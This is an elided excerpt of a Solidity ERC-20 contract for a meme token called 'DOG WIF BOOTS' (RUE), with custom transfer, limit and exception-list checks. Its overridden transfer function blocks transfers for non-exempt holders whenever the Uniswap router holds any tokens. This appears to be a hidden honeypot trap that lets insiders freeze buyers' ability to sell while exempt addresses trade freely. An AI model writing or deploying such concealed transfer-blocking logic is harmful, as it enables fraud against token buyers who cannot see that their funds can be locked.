...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1RUEDOGWIFBOOTS");
        require(recipient != address(0), "2RUEDOGWIFBOOTS");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3RUEDOGWIFBOOTS");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4RUEDOGWIFBOOTS");
        require(spender != address(0), "5RUEDOGWIFBOOTS");
...
contract RUE is ERC20 {
    ...
    constructor(address router) ERC20("DOG WIF BOOTS", "RUE", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6RUEDOGWIFBOOTS");
        require(to != address(0), "7RUEDOGWIFBOOTS");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8RUEDOGWIFBOOTS");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9RUEDOGWIFBOOTS");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0RUEDOGWIFBOOTS");
            }
        }
    }
}